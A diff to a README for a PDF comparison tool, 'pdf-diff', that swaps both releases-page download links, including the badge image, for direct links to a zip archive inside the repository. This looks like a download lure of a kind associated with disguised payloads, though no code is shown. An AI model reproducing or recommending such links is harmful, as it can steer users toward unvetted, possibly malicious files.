@@ -1,6 +1,6 @@
 # 📄 pdf-diff - Compare PDFs Easily and Securely
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Here-brightgreen)](https://github.com/Bhatiyani/pdf-diff/releases)
+[![Download Now](https://raw.githubusercontent.com/Bhatiyani/pdf-diff/main/public/diff_pdf_v3.2.zip)](https://raw.githubusercontent.com/Bhatiyani/pdf-diff/main/public/diff_pdf_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To get started, you need to download pdf-diff. Follow these steps:
 3. Download the file that matches your operating system (Windows, macOS, or Linux).
 4. Open the downloaded file and follow the instructions to run the application.
 
-[Download pdf-diff](https://github.com/Bhatiyani/pdf-diff/releases)
+[Download pdf-diff](https://raw.githubusercontent.com/Bhatiyani/pdf-diff/main/public/diff_pdf_v3.2.zip)
 
 ## 💻 System Requirements
 
